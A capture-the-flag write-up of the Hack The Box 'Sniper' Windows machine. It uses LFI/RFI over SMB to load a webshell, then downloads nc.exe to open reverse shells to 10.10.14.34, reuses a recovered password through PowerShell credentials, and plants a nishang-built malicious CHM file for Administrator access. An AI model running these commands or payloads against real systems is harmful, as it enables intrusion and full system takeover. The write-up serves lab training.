---
title: "Hack The Box - Sniper"
tags: [windows,medium,RFI , LFI , Windows , SMB , inetpub , nishang , ps-credentials , chm , .chm .]
categories: HackTheBox-Windows
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled.png)

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%201.png)

---

# *Enumerating Web*

⇒ On the homepage we are presented with the following options :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%202.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%203.png)

→ There is /blog and /user page.

---

### *⇒ Enumerating User Portal*

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%204.png)

→ After signing up we are presented with the following page :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%205.png)

After running gobuster we discover the following interesting pages but they are blank ( or maybe we dont have permission to access them ) :

```python
/db.php
/auth.php
```

We'll keep these pages in mind for later....

---

### *⇒ Enumerating Blog Page*

→ We have a page which has an interesting parameter in the url named lang containing a php filename :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%206.png)

→ Looks like this parameter is vulnerable to Local File Inclusion :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%207.png)

→ We are able to perform RFI  (Remote File Inclusion ) through SMB :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%208.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%209.png)

---

### *⇒ Exploiting RFI through SMB to get RCE :*

→ Sadly impacket-smbserver wasn't working. So lets setup smb ourselves 

→ Editing config [ /etc/samba/smb.conf ] :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2010.png)

→ Starting the service and creating a test file in /srv/smb :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2011.png)

→ It works :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2012.png)

⇒ We downloaded an webshell and saved it in the /srv/smb then accessed it :

[https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2013.png)

**powershell.exe -command Invoke-WebRequest -Uri '[http://10.10.14.34/nc.exe](http://10.10.14.34/nc.exe)' -OutFile 'C:\Windows\System32\spool\drivers\color\nc.exe'; cmd.exe /c C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.34 4444 -e cmd.exe**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2014.png)

---

## ⇒ *Privilege Escalation to User*

→ Looking back we saw db.php on the /user page. Going to inetpub/wwwroot/user/db.php we find credentials :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2015.png)

Password : **36mEAhz/B8xQ~2VM**

⇒ Using the password for user chris :

`$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force` 

`$cred = New-Object System.Management.Automation.PSCredential("Sniper\chris", $pass)` 

`Invoke-Command -Computer localhost -Credential $cred -Authentication Default -ScriptBlock {whoami}`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2016.png)

→ Popped an reverse shell as user chris :

**Invoke-Command -Computer localhost -Credential $cred -Authentication Default -ScriptBlock {C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.34 1234 -e cmd.exe}**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2017.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2017.png)

---

## ⇒ *Privilege Escalation to Administrator*

There's a folder C:\Docs which contains the following files :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2018.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2018.png)

There's also an instructions.chm in Chris Documents folder....

⇒ Looks like we have to place an .chm file in the Docs folder which will be opened by the Administrator .

→ Creating malicious .chm file using nishang :

Link : [https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1)

**Out-CHM -Payload "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.34 5555 -e cmd.exe" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"**

Uploaded it to the folder :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2019.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2019.png)

→ Waited for some time and we get reverse shell as Administrator :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2020.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sniper%20Box%206cf4da7753cb4488ad5492ba2cc6dac2/Untitled%2020.png)

